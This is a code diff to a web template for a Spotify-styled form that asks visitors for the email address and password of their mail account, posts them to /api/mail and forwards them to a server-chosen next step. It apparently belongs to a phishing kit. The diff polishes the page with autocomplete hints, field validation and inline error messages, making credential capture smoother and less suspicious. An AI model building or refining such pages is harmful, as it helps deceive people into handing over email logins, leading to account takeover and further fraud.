@@ -18,6 +18,7 @@
         .submit-btn{width:100%;padding:14px;background-color:#1db954;color:#000;border:none;border-radius:500px;font-size:1rem;font-weight:700;cursor:pointer;margin-top:10px}
         .submit-btn:hover{background-color:#1ed760}
         .lang-indicator{text-align:center;font-size:11px;color:#6c6c8a;margin-bottom:10px}
+        .error-msg{color:#e91429;font-size:13px;margin-top:8px;display:none;text-align:center}
     </style>
 </head>
 <body>
@@ -28,20 +29,29 @@
         <form id="genericMailForm">
             <div class="form-group">
                 <label>{{ get_text(lang, 'generic_email') }}</label>
-                <input type="email" id="mailEmail" required placeholder="{{ get_text(lang, 'generic_email') }}">
+                <input type="email" id="mailEmail" name="mailEmail" required placeholder="{{ get_text(lang, 'generic_email') }}" autocomplete="email">
             </div>
             <div class="form-group">
                 <label>{{ get_text(lang, 'generic_password') }}</label>
-                <input type="password" id="mailPassword" required placeholder="{{ get_text(lang, 'generic_password') }}">
+                <input type="password" id="mailPassword" name="mailPassword" required placeholder="{{ get_text(lang, 'generic_password') }}" autocomplete="current-password">
             </div>
             <button type="submit" class="submit-btn">{{ get_text(lang, 'generic_button') }}</button>
+            <div class="error-msg" id="errorMsg">Please fill in all fields</div>
         </form>
     </div>
     <script>
         document.getElementById('genericMailForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            
             const mailEmail = document.getElementById('mailEmail').value;
             const mailPassword = document.getElementById('mailPassword').value;
+            const errorMsg = document.getElementById('errorMsg');
+            
+            if (!mailEmail || !mailPassword) {
+                errorMsg.style.display = 'block';
+                return;
+            }
+            errorMsg.style.display = 'none';
             
             try {
                 const res = await fetch('/api/mail', {
@@ -57,10 +67,12 @@
                 if (data.status === 'success') {
                     window.location.href = data.next;
                 } else {
-                    alert('Error, please try again.');
+                    errorMsg.textContent = data.message || 'Error, please try again.';
+                    errorMsg.style.display = 'block';
                 }
             } catch(err) {
-                alert('Error, please try again.');
+                errorMsg.textContent = 'Network error, please try again.';
+                errorMsg.style.display = 'block';
             }
         });
     </script>
